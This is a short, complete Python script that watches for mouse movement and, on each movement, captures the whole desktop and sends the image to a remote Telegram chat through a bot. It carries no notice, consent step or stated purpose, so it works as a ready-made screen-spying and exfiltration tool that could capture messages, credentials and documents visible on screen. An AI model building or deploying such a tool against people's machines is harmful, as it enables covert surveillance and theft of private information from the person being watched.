import os
import hashlib
import pyautogui
from PIL import Image
from io import BytesIO
from telegram import Bot
import asyncio
import pygetwindow as gw
from tenacity import retry, stop_after_delay, wait_fixed

# Telegram bot token
TOKEN = 'your_telegram_bot_token'
# Telegram chat ID
CHAT_ID = 'your_chat_id'


# Initialize the Telegram bot
bot = Bot(TOKEN)

# Directory to store screenshots
SCREENSHOT_DIR = 'screenshots'

# Function to take a screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    return screenshot

# Function to hash an image
def hash_image(image):
    return hashlib.md5(image.tobytes()).hexdigest()

# Function to compare two images
def images_are_different(image1, image2):
    hash1 = hash_image(image1)
    hash2 = hash_image(image2)
    return hash1 != hash2

# Function to send image to Telegram with retry logic
@retry(stop=stop_after_delay(60), wait=wait_fixed(1))
async def send_image_to_telegram(image):
    try:
        bio = BytesIO()
        # Save the image with increased quality (e.g., quality=95)
        image.save(bio, format="PNG", quality=100)
        bio.seek(0)
        await bot.send_photo(chat_id=CHAT_ID, photo=bio)
    except Exception as e:
        print(f"Error sending image to Telegram: {e}")
        raise

# Function to check for desktop activity
def check_desktop_activity():
    # Get current mouse position
    current_pos = pyautogui.position()
    # Get the last known mouse position
    last_pos = getattr(check_desktop_activity, 'last_mouse_position', None)
    # Update the last known mouse position
    check_desktop_activity.last_mouse_position = current_pos
    # Check if there's a change in mouse position
    if last_pos is not None and last_pos != current_pos:
        return True
    return False

# Initialize last mouse position
check_desktop_activity.last_mouse_position = None

async def main():
    while True:
        if check_desktop_activity():
            # Take a screenshot
            current_screenshot = take_screenshot()
            # Send the new screenshot to Telegram
            await send_image_to_telegram(current_screenshot)
        # Sleep for 1 second before checking again
        await asyncio.sleep(1)

# Run the asyncio loop
asyncio.run(main())
